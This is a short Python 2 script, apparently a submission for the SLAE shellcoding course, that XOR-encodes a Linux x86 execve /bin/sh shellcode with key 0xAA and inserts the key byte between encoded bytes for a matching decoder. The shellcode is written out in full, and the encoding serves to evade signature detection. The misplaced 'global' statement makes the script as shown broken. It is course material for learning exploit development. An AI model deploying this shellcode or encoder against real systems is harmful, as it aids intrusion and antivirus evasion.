#!/usr/bin/python
# Author: Eric Van Zutphen
# Python XOR Insertion Encoder
# SLAE ID: SLAE - 1140

import random

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

print 'Raw Shellcode Length..................' + str(len(shellcode))
print 'Need this for insertion decoder script ^^'

def encoder():
    xorencoded = ""
    for x in bytearray(shellcode):
        x = x ^ 0xAA # XORing
        xorencoded += '0x'
        xorencoded += '%02x,' %x
        xorencoded += '0x%02x,' % 0xAA
        global xorencoded
encoder()


print xorencoded